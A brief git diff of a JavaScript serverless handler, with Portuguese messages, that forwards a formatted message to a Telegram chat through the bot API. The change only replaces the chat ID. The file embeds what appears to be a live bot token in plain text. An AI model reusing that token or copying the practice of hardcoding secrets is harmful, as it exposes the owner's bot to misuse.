@@ -60,7 +60,7 @@ export default async function handler(req, res) {
 📆 | DATA/HORA: ${dataHora}`;
 
   const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
-  const chatId = '-1003531286496';
+  const chatId = '-1003615689623';
 
   const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;
 
@@ -79,3 +79,4 @@ export default async function handler(req, res) {
     return res.status(500).send('Erro total');
   }
 }
+
